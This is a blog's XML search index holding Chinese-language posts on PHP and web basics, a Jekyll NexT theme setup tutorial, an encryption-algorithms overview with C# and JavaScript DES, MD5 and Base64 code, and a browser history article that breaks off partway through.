      <content type="text"><![CDATA[Web 入门B/S vs C/SB/S：SMS, SNS, WebGame, Wiki, RSS, BLog, 电子商务系统Web 2.0Web1.0-&gt;Web2.0-&gt;Web3.0（Microsoft，站内信可以直接和其他网站进行交换和互动）-&gt;Web4.0（Eg. 聚餐吃饭情形，实现资源共享）脚本语言和主流 Web 应用开发平台脚本语言：PHP, HTML, CSS, JavaScript, VBScript, ActionScript, ASP, JSP, SQL, Perl, Python, Ruby, JavaFx, Lua, AutoIt, …  Asp.Net  JavaEE  LAMP    HTTP（HyperText Transfer Protocol）    工作过程：          客户端连接到 Web Server      发送 HTTP 请求      服务器接收到请求并返回 HTTP 响应      释放 TCP 连接      客户端解析 HTML 内容        HTTP Request Header        请求行（头部行）：请求方法，URL，HTTP 版本        HTTP Response Header        协议版本，状态码，原因短语content-length:content-type: text/html        常见的状态码            200      301      400      500      502        URL vs URI        URL(Uniform Resource Locator，统一资源定位符) URI(Uniform Resource Identifier，统一资源标识符)，用于标识互联网资源名称的字符串，常见形式就是 URL，另外还有一个叫 URN(Uniform Resource Name，统一资源名称)，通俗地说，URL 和 URN 是 URI 的子集，URI 属于更高层次的抽象。        Web 工作原理                  当用户打开浏览器，输入一个 URL，按下回车键，请大致描述发生的所有事件。          HTML5 &amp; CSS3          HTML5                    新变化          &lt;!-- 声明 --&gt;  &lt;!DOCTYPE html&gt;  &lt;!-- 编码 --&gt;  &lt;meta charset="UTF-8"&gt;  &lt;!-- 具有 boolean 属性 --&gt;  &lt;input type="text" disabled="false" readonly="true" /&gt;  &lt;!-- 新增结构元素、表单属性、多媒体属性、其他元素 --&gt;  &lt;header&gt;&lt;/header&gt;  &lt;section&gt;&lt;/section&gt;  &lt;aside&gt;&lt;/aside&gt;  &lt;footer&gt;&lt;footer&gt;          2. 高级功能：              绘制图形，如签名      本地存储和离线应用：本地存储分为 Web Storage(原 HTML 4 中扩展)和本地 DB(HTML5 新增)      通信 API：两种方式：跨文档消息传输和 Web Sockets API。解决了同源通信和跨域通信，同时 Server 不再需要被动的等待 Client 发出请求，只要两端建立连接后，Server 端就可以主动推送数据给 Client 端。      处理线程：在 HTML4 和 JS 编写程序时，所有的处理都是单线程内执行，话费时间比较长。HTML5 新增 Web Workers API，可以容易地在后台创建线程，并且这个后台线程还能创建多个子线程。      获取地理位置        CSS3        圆角、多背景、3D 动画、渐变、阴影效果、透明度、……        Less CSS 框架        主流前端技术        BootStrap        Jquery        VueJS        PHP 基础        PHP 学习导向                  确定学习目标          坚持动手实践          以解决事情为先          学习路线图            搭建 PHP 环境            Linux 下源码安装            Windows 下 WampServer 集成包安装                    安装准备          安装步骤          环境测试          常见配置                          改变 www 目录位置          phpMyAdmin管理            PHP 基本语法            基本语法结构            注释 &amp; 指令分隔副符            变量及变量数据类型、数据类型转换            函数            运算符和表达式            流程控制            函数的应用              1. 自定义函数  2. 内置函数  3. 递归函数  4. 匿名函数(闭包函数) ## PHP Array ### foreach &amp; list &amp; each &amp; while &amp; for ### 数组的内部指针：  1. current()  2. key()  3. next()  4. prev()  5. end()  6. reset() ### 预定义 Array  1. $_SERVER  2. $_GET  3. $_POST  4. ... ### Array 操作函数 ### 注意事项                                          ”+“可以把两个数组合并，与 Array_merget() 作用差不多，只是它会去除重复的键值      两个 Array 存在相同的 Key、Value可以使用运算符比较      删除 Array 元素，使用 unset，但不会重建数组索引      Array 下标只能是 int 和 string        PHP String        单引号和双引号的区别        echo &amp; print &amp; var_dump &amp; die &amp; printf &amp; sprintf        常用字符串函数        正则表达式        面向对象        类、对象、抽象方法、接口        对象类型在内存中的分配：栈、堆、静态区、代码段        面向对象三特性                  封装          继承          多态：最直接的定义就是让具有继承关系的不同类，可以对相同的成员方法进行调用，产生不同的效果。            单态设计模式            instanceOf 关键字            trait            命名空间            克隆对象            对象序列化                              ]]></content>
      <categories>
        
          <category> php </category>
        
      </categories>
      <tags>
        
          <tag> PHP-Programmer </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[Customize my own theme tutorial with Next Theme]]></title>
      <url>/jekyll/2018/08/05/next-tutorial/</url>
      <content type="text"><![CDATA[PrefaceNexT theme from Hexo NexT, and this site build  with org-mode. The following are some references:  Jekyll Official Site  NexT theme  Live Preview  Yitao’s Blog  NexT 使用文档   Setting up your GitHub Pages site locally with Jekyll    Installation          Check whether you have Ruby 2.1.0 or higher installed:          $ ruby --version                    Install Bundler and Jekyll:          $ gem install bundler jekyll                    Clone:          $ git clone https://github.com/zhaorengui/zhaorengui.github.io.git  $ cd jekyll-theme-next                    Install dependencies packages:          $ bundle install                    Running your Jekyll site locally:          $ bundle exec jekyll server                Access http://localhost:4000 on browser.        Diretory Structure        ├─_data		数据目录│  ├─languages	语言目录├─_drafts	(预发布)草稿目录├─_include	固定文件模板引用目录├─_orgs		org文件目录│  ├─_assets	资源目录，img,js,css,...│  ├─_drafts	org草稿目录│  ├─_posts	org发布目录├─_posts	文章目录，皆是html文件├─_sass		scss文件目录├─_site		站点访问目录├─about		关于目录├─archives	归档目录├─assets	资源目录├─categories	分类目录├─tag		标签目录├─tags		标签目录├─404.html	404页面├─Gemfile	jekyll文件	├─Gemfile.lock	jekyll文件├─README.en.md	英文说明文件├─README.md	说明文件├─_config.yml	配置文件├─index.html	入口文件└─search.xml	搜索配置文件                Name            分类命名：英文名称全部小写，如algorithms，c#，javascript等。两个单词以上组成，采用-字符连接。分类名称不能重名。      标签命名：与实际常见命名一致，如MySQL，PHP，Jekyll等。另外一些两个单词以上组成的术语，建议采用-字符连接，如Design-Pattern。      org 源文件命名：日期+文件描述名称，文件描述名称采用-字符连接，如2018-12-12-vue-iview.org。      org 发布目录命名：采用驼峰法命名。        .org            ScreenshotsBrowser supportContributingWelcome you submit issues.]]></content>
      <categories>
        
          <category> jekyll </category>
        
      </categories>
      <tags>
        
          <tag> jekyll </tag>
        
          <tag> NexT </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[加密算法]]></title>
      <url>/algorithms/2018/06/12/encrypt/</url>
      <content type="text"><![CDATA[1 前言加密算法是密码技术的核心，有些算法已经遭到破译，有些安全度不高，有些强度不明，有些待进—步分析，有些需要深入研究，而神秘的加密算法世界，又会有新的成员加入，期待更安全的算法诞生。2 对称加密算法2.1 说明在对称加密算法中，加密使用的密钥和解密使用的密钥是相同的。也就是说，加密和解密都是使用的同一个密钥。因此对称加密算法要保证安全性的话，密钥要做好保密，只能让使用的人知道，不能对外公开。「密钥」，一般就是一个字符串或数字，在加密或者解密时传递给加密/解密算法。常见的对称加密算法：DES、3DES、DESX、Blowfish、IDEA、RC4、RC5、RC6和AES2.2 AES2.2.1 简介AES加密算法是密码学中的高级加密标准，该加密算法采用对称分组密码体制，密钥长度的最少支持为128、192、256，分组长度128位，算法应易于各种硬件和软件实现。这种加密算法是美国联邦政府采用的区块加密标准，这个标准用来替代原先的DES，已经被多方分析且广为全世界所使用。AES加密算法被设计为支持128／192／256位（/32=nb)数据块大小（即分组长度）；支持128／192／256位（/32=nk)密码长度，在10进制里，对应34×1038、62×1057、1.1×1077个密钥。2.3 DES2.3.1 简介DES加密算法是一种分组密码，以64位为分组对数据加密，它的密钥长度是56位，加密解密用同一算法。DES加密算法是对密钥进行保密，而公开算法，包括加密和解密算法。这样，只有掌握了和发送方相同密钥的人才能解读由DES加密算法加密的密文数据。因此，破译DES加密算法实际上就是搜索密钥的编码。对于56位长度的密钥来说，如果用穷举法来进行搜索的话，其运算次数为256。随着计算机系统能力的不断发展，DES的安全性比它刚出现时会弱得多，然而从非关键性质的实际出发，仍可以认为它是足够的。不过，DES现在仅用于旧系统的鉴定，而更多地选择新的加密标准。2.3.2 C# Code#region DES&#21152;&#23494;&#35299;&#23494;/// &lt;summary&gt;/// DES&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="data"&gt;&#21152;&#23494;&#25968;&#25454;&lt;/param&gt;/// &lt;param name="key"&gt;8&#20301;&#23383;&#31526;&#30340;&#23494;&#38053;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;param name="iv"&gt;8&#20301;&#23383;&#31526;&#30340;&#21021;&#22987;&#21270;&#21521;&#37327;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string DESEncrypt(string data, string key, string iv){    byte[] byKey = System.Text.ASCIIEncoding.ASCII.GetBytes(key);    byte[] byIV = System.Text.ASCIIEncoding.ASCII.GetBytes(iv);    DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();    int i = cryptoProvider.KeySize;    MemoryStream ms = new MemoryStream();    CryptoStream cst = new CryptoStream(ms, cryptoProvider.CreateEncryptor(byKey, byIV), CryptoStreamMode.Write);    StreamWriter sw = new StreamWriter(cst);    sw.Write(data);    sw.Flush();    cst.FlushFinalBlock();    sw.Flush();    return Convert.ToBase64String(ms.GetBuffer(), 0, (int)ms.Length);}/// &lt;summary&gt;/// DES&#35299;&#23494;/// &lt;/summary&gt;/// &lt;param name="data"&gt;&#35299;&#23494;&#25968;&#25454;&lt;/param&gt;/// &lt;param name="key"&gt;8&#20301;&#23383;&#31526;&#30340;&#23494;&#38053;&#23383;&#31526;&#20018;(&#38656;&#35201;&#21644;&#21152;&#23494;&#26102;&#30456;&#21516;)&lt;/param&gt;/// &lt;param name="iv"&gt;8&#20301;&#23383;&#31526;&#30340;&#21021;&#22987;&#21270;&#21521;&#37327;&#23383;&#31526;&#20018;(&#38656;&#35201;&#21644;&#21152;&#23494;&#26102;&#30456;&#21516;)&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string DESDecrypt(string data, string key, string iv){    byte[] byKey = System.Text.ASCIIEncoding.ASCII.GetBytes(key);    byte[] byIV = System.Text.ASCIIEncoding.ASCII.GetBytes(iv);    byte[] byEnc;    try    {        byEnc = Convert.FromBase64String(data);    }    catch    {        return null;    }    DESCryptoServiceProvider cryptoProvider = new DESCryptoServiceProvider();    MemoryStream ms = new MemoryStream(byEnc);    CryptoStream cst = new CryptoStream(ms, cryptoProvider.CreateDecryptor(byKey, byIV), CryptoStreamMode.Read);    StreamReader sr = new StreamReader(cst);    return sr.ReadToEnd();}#endregion2.4 3DES2.4.1 C# Code#region 3DES &#21152;&#23494;&#35299;&#23494;public static string DES3Encrypt(string data, string key){   TripleDESCryptoServiceProvider DES = new TripleDESCryptoServiceProvider();   DES.Key = ASCIIEncoding.ASCII.GetBytes(key);   DES.Mode = CipherMode.CBC;   DES.Padding = PaddingMode.PKCS7;   ICryptoTransform DESEncrypt = DES.CreateEncryptor();   byte[] Buffer = ASCIIEncoding.ASCII.GetBytes(data);   return Convert.ToBase64String(DESEncrypt.TransformFinalBlock(Buffer, 0, Buffer.Length));}public static string DES3Decrypt(string data, string key){    TripleDESCryptoServiceProvider DES = new TripleDESCryptoServiceProvider();    DES.Key = ASCIIEncoding.ASCII.GetBytes(key);    DES.Mode = CipherMode.CBC;    DES.Padding = System.Security.Cryptography.PaddingMode.PKCS7;    ICryptoTransform DESDecrypt = DES.CreateDecryptor();    string result = "";    try    {        byte[] Buffer = Convert.FromBase64String(data);        result = ASCIIEncoding.ASCII.GetString(DESDecrypt.TransformFinalBlock(Buffer, 0, Buffer.Length));    }    catch (Exception e)    {    }    return result;}#endregion3 非对称加密算法3.1 说明非对称加密算法采用「公钥密码体制(public-key cryptography)」，公钥密码体制分为三部分公钥、私钥、加密解密算法，它的加密解密过程如下： 加密：通过加密算法和公钥对内容(或者说明文)进行加密，得到密文。加密过程需要用到公钥。解密：通过解密算法和私钥对密文进行解密，得到明文。解密过程需要用到解密算法和私钥。注意，由公钥加密的内容，只能由私钥进行解密，也就是说，由公钥加密的内容，如果不知道私钥，是无法解密的。公钥密码体制的公钥和算法都是公开的(这是为什么叫公钥密码体制的原因)，私钥是保密的。大家都以使用公钥进行加密，但是只有私钥的持有者才能解密。在实际的使用中，有需要的人会生成一对公钥和私钥，把公钥发布出去给别人使用，自己保留私钥。常见的非对称加密算法：RSA、ECC（移动设备用）、Diffie-Hellman、El Gamal、DSA（数字签名用）3.2 RSA3.2.1 简介RSA(Rivest–Shamir–Adleman)加密算法是目前最有影响力的公钥加密算法，并且被普遍认为是目前最优秀的公钥方案之一。RSA是第一个能同时用于加密和数宇签名的算法，它能够抵抗到目前为止已知的所有密码攻击，已被ISO推荐为公钥数据加密标准。RSA加密算法基于一个十分简单的数论事实：将两个大素数相乘十分容易，但那时想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。RSA密码体制是一种公钥密码体制，公钥公开，私钥保密，它的加密解密算法是公开的。 由公钥加密的内容可以并且只能由私钥进行解密，并且由私钥加密的内容可以并且只能由公钥进行解密。也就是说，RSA的这一对公钥、私钥都可以用来加密和解密，并且一方加密的内容可以由并且只能由对方进行解密。「签名」，签名就是在信息的后面再加上一段内容，可以证明信息没有被修改过，怎么样可以达到这个效果呢？一般是对信息做一个hash计算得到一个hash值，注意，这个过程是不可逆的，也就是说无法通过hash值得出原来的信息内容。再把信息发送出去时，把这个hash值加密后做为一个签名和信息一起发出去。 接收方在收到信息后，会重新计算信息的hash值，并和信息所附带的hash值(解密后)进行对比，如果一致，就说明信息的内容没有被修改过，因为这里hash计算可以保证不同的内容一定会得到不同的hash值，所以只要内容一被修改，根据信息内容计算的hash值就会变化。当然，不怀好意的人也可以修改信息内容的同时也修改hash值，从而让它们可以相匹配，为了防止这种情况，hash值一般都会加密后(也就是签名)再和信息一起发送，以保证这个hash值不被修改。至于如何让别人可以解密这个签名，这个过程涉及到数字证书等概念。举例说明：外部系统（B）调用核心系统（A）接口时，需通过非对称加密算法解决安全上的问题，如伪装调用、模拟调用等。（此例通过公钥加密，私钥解密的方式） 首先，在A端生成密钥对，得到public_key.pem，private_key.pem。（生成密钥对方法参考：https://www.cnblogs.com/taoshihan/p/6340854.html）在A端编写签名方法（就是使用公钥进行加密的过程），加密的数据可以是字符串或时间。如果是加密数据是时间，如'Y-m-d H:00:00'，代表当前整点（小时）内有效。在B端获取到第1步中生成的public_key.pem，通过public_key.pem调用A端签名方法。请求B端接口时，A端首先进行签名验证，验证通过则允许调用，不通过则提示错误信息。4 Hash算法4.1 说明Hash算法特别的地方在于它是一种单向算法，用户可以通过Hash算法对目标信息生成一段特定长度的唯一的Hash值，却不能通过这个Hash值重新获得目标信息。因此Hash算法常用在不可还原的密码存储、信息完整性校验等。常见的Hash算法：MD5、HAVAL、SHA、HMAC、HMAC-MD5、HMAC-SHA14.2 MD54.2.1 简介MD5为计算机安全领域广泛使用的一种散列函数，用以提供消息的完整性保护。对MD5加密算法简要的叙述可以为：MD5以512位分组来处理输入的信息，且每一分组又被划分为16个32位子分组，经过了一系列的处理后，算法的输出由四个32位分组组成，将这四个32位分组级联后将生成—个128位散列值。MD5被广泛用于各种软件的密码认证和钥匙识别上。MD5用的是哈希函数，它的典型应用是对一段信息产生信息摘要，以防止被篡改。MD5的典型应用是对一段Message产生fingerprin指纹，以防止被“篡改”。如果再有—个第三方的认证机，用MD5还可以防止文件作者的“抵赖”，这就是所谓的数字签名应用MD5还广泛用于操作系统的登陆认证上，如UNIX、各类BSD系统登录密码、数字签名等诸多方。4.2.2 C# Code#region MD5&#21152;&#23494;/// &lt;summary&gt;/// MD5&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#21152;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string MD5Encrypt(string input){    return MD5Encrypt(input, new UTF8Encoding());}/// &lt;summary&gt;/// MD5&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#21152;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;param name="encode"&gt;&#23383;&#31526;&#30340;&#32534;&#30721;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string MD5Encrypt(string input, Encoding encode){    MD5 md5 = new MD5CryptoServiceProvider();    byte[] t = md5.ComputeHash(encode.GetBytes(input));    StringBuilder sb = new StringBuilder(32);    for (int i = 0; i &lt; t.Length; i++)        sb.Append(t[i].ToString("x").PadLeft(2, '0'));        return sb.ToString();    }/// &lt;summary&gt;/// MD5&#23545;&#25991;&#20214;&#27969;&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="sr"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string MD5Encrypt(Stream stream){    MD5 md5serv = MD5CryptoServiceProvider.Create();    byte[] buffer = md5serv.ComputeHash(stream);    StringBuilder sb = new StringBuilder();    foreach (byte var in buffer)        sb.Append(var.ToString("x2"));    return sb.ToString();}/// &lt;summary&gt;/// MD5&#21152;&#23494;(&#36820;&#22238;16&#20301;&#21152;&#23494;&#20018;)/// &lt;/summary&gt;/// &lt;param name="input"&gt;&lt;/param&gt;/// &lt;param name="encode"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string MD5Encrypt16(string input, Encoding encode){    MD5CryptoServiceProvider md5 = new MD5CryptoServiceProvider();    string result = BitConverter.ToString(md5.ComputeHash(encode.GetBytes(input)), 4, 8);    result = result.Replace("-", "");    return result;}#endregion4.3 SHA4.3.1 简介SHA(Secure Hash Algorithm)是一个密码散列函数家族，是FIPS(Federal Information Processing Standards, 联邦信息处理标准)所认证的安全散列算法。由美国国家安全局（NSA）所设计，并由美国国家标准与技术研究院（NIST）发布，是美国的政府标准。分别是SHA-0, SHA-1, SHA-2, SHA-3，具体参考SHA家族SHA-35 其他5.1 Base64编码算法5.1.1 简介BASE64其实不是安全领域下的加密解密算法，只能算是一个编码算法。是网络上最常见的用于传输8bit字节代码的编码方式之一，Base64编码可用于在HTTP环境下传递较长的标识信息。例如，在JAVAPERSISTENCE系统HIBEMATE中，采用了Base64来将一个较长的唯一标识符编码为一个字符串，用作HTTP表单和HTTPGETURL中的参数。在其他应用程序中，也常常需要把二进制数据编码为适合放在URL（包括隐藏表单域）中的形式。此时，采用Base64编码不仅比较简短，同时也具有不可读性，即所编码的数据不会被人用肉眼所直接看到。5.1.2 C# Code/// &lt;summary&gt;/// &#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="codeType"&gt;&lt;/param&gt;/// &lt;param name="code"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Encrypt(string codeType,string code){    string encode = "";    byte[] bytes = Encoding.GetEncoding(codeType).GetBytes(code);    try    {        encode = Convert.ToBase64String(bytes);    }    catch (Exception ex)    {        encode = code;    }    return encode;}/// &lt;summary&gt;/// &#35299;&#23494;/// &lt;/summary&gt;/// &lt;param name="codeType"&gt;&lt;/param&gt;/// &lt;param name="code"&gt;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Decrypt(string codeType,string code){    string decode = "";    byte[] bytes = Convert.FromBase64String(code);     try    {        decode = Encoding.GetEncoding(codeType).GetString(bytes); //&#23558;&#25351;&#23450;&#23383;&#33410;&#25968;&#32452;&#20013;&#30340;&#19968;&#20010;&#23383;&#33410;&#24207;&#21015;&#35299;&#30721;&#20026;&#19968;&#20010;&#23383;&#31526;&#20018;&#12290;     }    catch (Exception ex)    {        decode = code;    }    return decode;}//简写#region Base64&#21152;&#23494;&#35299;&#23494;/// &lt;summary&gt;/// Base64&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#21152;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Encrypt(string input){    return Base64Encrypt(input, new UTF8Encoding());}/// &lt;summary&gt;/// Base64&#21152;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#21152;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;param name="encode"&gt;&#23383;&#31526;&#32534;&#30721;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Encrypt(string input, Encoding encode){    return Convert.ToBase64String(encode.GetBytes(input));}/// &lt;summary&gt;/// Base64&#35299;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#35299;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Decrypt(string input){    return Base64Decrypt(input, new UTF8Encoding());}/// &lt;summary&gt;/// Base64&#35299;&#23494;/// &lt;/summary&gt;/// &lt;param name="input"&gt;&#38656;&#35201;&#35299;&#23494;&#30340;&#23383;&#31526;&#20018;&lt;/param&gt;/// &lt;param name="encode"&gt;&#23383;&#31526;&#30340;&#32534;&#30721;&lt;/param&gt;/// &lt;returns&gt;&lt;/returns&gt;public static string Base64Decrypt(string input, Encoding encode){    return encode.GetString(Convert.FromBase64String(input));}#endregion5.1.3 JavaScript Code// private propertyvar _keyStr = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";function encodeBase64(input) {    var output = "";    var chr1, chr2, chr3, enc1, enc2, enc3, enc4;    var i = 0;    input = _utf8_encode(input);    while (i &lt; input.length) {        chr1 = input.charCodeAt(i++);        chr2 = input.charCodeAt(i++);        chr3 = input.charCodeAt(i++);        enc1 = chr1 &gt;&gt; 2;        enc2 = ((chr1 &amp; 3) &lt;&lt; 4) | (chr2 &gt;&gt; 4);        enc3 = ((chr2 &amp; 15) &lt;&lt; 2) | (chr3 &gt;&gt; 6);        enc4 = chr3 &amp; 63;        if (isNaN(chr2)) {            enc3 = enc4 = 64;        } else if (isNaN(chr3)) {            enc4 = 64;        }        output +=_keyStr.charAt(enc1);        output+= _keyStr.charAt(enc2);        output+=_keyStr.charAt(enc3);        output+= _keyStr.charAt(enc4);   }   return output;}//Base64 &#35299;&#23494;function decodeBase64(input) {    var output = "";    var chr1, chr2, chr3;    var enc1, enc2, enc3, enc4;    var i = 0;    input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");    while (i &lt; input.length) {        enc1 = _keyStr.indexOf(input.charAt(i++));        enc2 = _keyStr.indexOf(input.charAt(i++));        enc3 = _keyStr.indexOf(input.charAt(i++));        enc4 = _keyStr.indexOf(input.charAt(i++));        chr1 = (enc1 &lt;&lt; 2) | (enc2 &gt;&gt; 4);        chr2 = ((enc2 &amp; 15) &lt;&lt; 4) | (enc3 &gt;&gt; 2);        chr3 = ((enc3 &amp; 3) &lt;&lt; 6) | enc4;        output = output + String.fromCharCode(chr1);        if (enc3 != 64) {            output = output + String.fromCharCode(chr2);        }        if (enc4 != 64) {            output = output + String.fromCharCode(chr3);        }    }    output = _utf8_decode(output);    return output;}// private method for UTF-8 decodingfunction _utf8_decode(utftext) {    var string = "";    var i = 0;    var c = c1 = c2 = 0;    while (i &lt; utftext.length) {        c = utftext.charCodeAt(i);        if (c &lt; 128) {            string += String.fromCharCode(c);            i++;        } else if ((c &gt; 191) &amp;&amp; (c &lt; 224)) {            c2 = utftext.charCodeAt(i + 1);            string += String.fromCharCode(((c &amp; 31) &lt;&lt; 6) | (c2 &amp; 63));            i += 2;        } else {            c2 = utftext.charCodeAt(i + 1);            c3 = utftext.charCodeAt(i + 2);            string += String.fromCharCode(((c &amp; 15) &lt;&lt; 12) | ((c2 &amp; 63) &lt;&lt; 6) | (c3 &amp; 63));            i += 3;        }    }    return string;}5.2 HTTPS​HTTPS（全称：Hypertext Transfer Protocol over Secure Socket Layer），是以安全为目标的HTTP通道，简单讲是HTTP的安全版。即HTTP下加入SSL层，HTTPS的安全基础是SSL(SSL使用40 位关键字作为RC4流加密算法，这对于商业信息的加密是合适的。)，因此加密的详细内容就需要SSL。https:URL表明它使用了HTTP，但HTTPS存在不同于HTTP的默认端口及一个加密/身份验证层（在HTTP与TCP之间），提供了身份验证与加密通讯方法，现在它被广泛用于万维网上安全敏感的通讯，例如交易支付方面。它的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。6 总结加密算法是可逆的，用来对敏感数据进行保护。散列算法(签名算法、哈希算法)是不可逆的，主要用于身份验证。对称加密算法使用同一个密匙加密和解密，速度快，适合给大量数据加密。对称加密客户端和服务端使用同一个密匙，存在被抓包破解的风险。非对称加密算法使用公钥加密，私钥解密，私钥签名，公钥验签。安全性比对称加密高，但速度较慢。非对称加密使用两个密匙，服务端和客户端密匙不一样，私钥放在服务端，黑客一般是拿不到的，安全性高。Base64不是安全领域下的加解密算法，只是一个编码算法，通常用于把二进制数据编码为可写的字符形式的数据，特别适合在http，mime协议下的网络快速传输数据。UTF-8和GBK中文的Base64编码结果是不同的。采用Base64编码不仅比较简短，同时也具有不可读性，即所编码的数据不会被人用肉眼所直接看到，但这种方式很初级，很简单。Base64可以对图片文件进行编码传输。https协议广泛用于万维网上安全敏感的通讯，例如交易支付方面。它的主要作用可以分为两种：一种是建立一个信息安全通道，来保证数据传输的安全；另一种就是确认网站的真实性。大量数据加密建议采用对称加密算法，提高加解密速度；小量的机密数据，可以采用非对称加密算法。在实际的操作过程中，我们通常采用的方式是：采用非对称加密算法管理对称算法的密钥，然后用对称加密算法加密数据，这样我们就集成了两类加密算法的优点，既实现了加密速度快的优点，又实现了安全方便管理密钥的优点。MD5标准密钥长度128位（128位是指二进制位。二进制太长，所以一般都改写成16进制，每一位16进制数可以代替4位二进制数，所以128位二进制数写成16进制就变成了128/4=32位。16位加密就是从32位MD5散列中把中间16位提取出来）；sha1标准密钥长度160位(比MD5摘要长32位)，Base64转换后的字符串理论上将要比原来的长1/3。7 参考资料常见加密算法分类常见加密算法分类,用途,原理以及比较JS实现base64加密解密几种常用加密算法比较SHA家族C# 加密解密(DES,3DES,MD5,Base64)类c# base64算法解密密码学加密算法(DES,AES,RSA,MD5,SHA1,Base64)比较和项目应用]]></content>
      <categories>
        
          <category> algorithms </category>
        
      </categories>
      <tags>
        
          <tag> Encrypt </tag>
        
          <tag> 加密 </tag>
        
      </tags>
      <tags></tags>
    </entry>
  
    <entry>
      <title><![CDATA[你还在使用IE浏览器吗?]]></title>
      <url>/software/2018/05/25/%E4%BD%A0%E8%BF%98%E5%9C%A8%E4%BD%BF%E7%94%A8IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%90%97/</url>
      <content type="text"><![CDATA[1 写在前面阅读本文，您将会了解到关于浏览器的如下内容：* 浏览器的定义* 浏览器的重要地位;* 浏览器的发展历史;* 浏览器哪家强;* 关于 Chrome 浏览器。另外，需要特别声明一下，本文不会做出一定要选择那一款浏览器的任何结论，描述内容及数据仅供参考。2 浏览器简介2.1 浏览器的正确定义浏览器是指可以显示网页服务器或者文件系统的HTML文件内容，并让用户与这些文件交互的一种软件。2.2 浏览器的重要地位互联网得以飞速发展，浏览器起到的重要作用毋庸置疑。Web技术的发展，浏览器将会起到越来越重要的作用。首先，浏览器作为互联网的入口，具有战略意义。浏览器的用户量，绝大部分来自于网络入口（如：搜索引擎、网址导航等）。其次，浏览器作为互联网工具，具有数据级意义。所有在浏览器上的操作，浏览的网页记录、下载的视频记录、聊天记录、用户名、密码、手机号、银行卡号等，只要是你操作的都能被记录，这些数据的作用以及分析后的结果可想而知。再次，就是业务推送和广告。当然，这将会带来丰厚的利润。最后，浏览器发展至今，其地位可以说是举足轻重。不管是对Web技术还是对整个互联网影响都是深远的。3 浏览器发展史3.1 第一个Web浏览器的诞生* 1990年，Tim Berners-Lee（提姆·柏內茲-李）发明了第一个网页浏览器WorldWideWeb，后改名为Nexus。3.2 各类浏览器* 1993年，Marc Andreessen（馬克·安德森）发布了Mosaic，成为了当时最流行的浏览器，进一步推动了浏览器的创新。Mosaic使互联网得以迅速发展。* 1994年10月，网景公司发布了他们的旗舰产品：网景导航者，但第二年Netscape的优势就被削弱了。* 1996年，Opera（欧朋浏览器）首次亮相，但它从未被广泛使用，但它号称是全球第一手机浏览器Opera的中文品牌产品。* 2003年，1月7日，苹果公司所开发的Safari浏览器首度发行测试版，开始成为Mac OS X 的默认浏览器，也是IOS内置的默认浏览器。* 2004年，Firefox（火狐浏览器） 1.0版本发布，发布以来，全球市场占有率为15%到25%。* 2009年6月4日，Chrome浏览器在Mac OS X和Linux操作系统上正式发布了预览版本。* 2010年，Chrome浏览器5.0版本是同时支持Windows，Mac OS X和Linux三个操作系统的稳定版本。* 2012年，2月7日，Google发布了Chrome Android测试版，标志着Chrome浏览器全面进军移动平台。发展至今，Chrome浏览器已经到66.0版本。3.3 IE浏览器* 1995年8月，错失了网络浪潮的微软购入了Spyglass公司的技术，名为Internet Explorer的浏览器诞生了，因捆绑于Windows，Internet Explorer于网页浏览器市场取得了主导地位，其市占率于2002年达到最高时超过95%。* 1995年11月，IE 2.0版本与Windows 95和Windows NT同时发布。* 1996年8月，IE 3.0版本免费发布，该版本包含在Windows 95中，同时也由对应的OEM渠道发布。* 1997年，9月，IE 4.0版本发布，是包含在最新的测试版Windows 98。* 1999年，3月，IE 5.0版本发布。* 2001年，8月27日，IE 6.0版本和Windows XP一起发布。* 2005年，7月27日，伴随着Windows Vista Beta的发布，IE7 Beta 1版问世。* 2008年，9月，Google Chrome浏览器发布，仅使用于Microsoft Windows XP SP2以上版本。* 2009年，3月19日，IE 8版本发布。* 2011年，3月14日，Microsoft发布了IE 9版本，发布1个月后，IE 10版本也提供了下载。* 2013年，6月26日，随着Windows 8.1预览版的发布，集成IE11预览版本一同面世。* 2015年，3月，Microsoft确认将放弃IE品牌，转而在windows10上，Microsoft Edge取代了。同年10月Microsoft宣布2016年1月起停止支持老版本IE浏览器。4 浏览器市场占比4.1 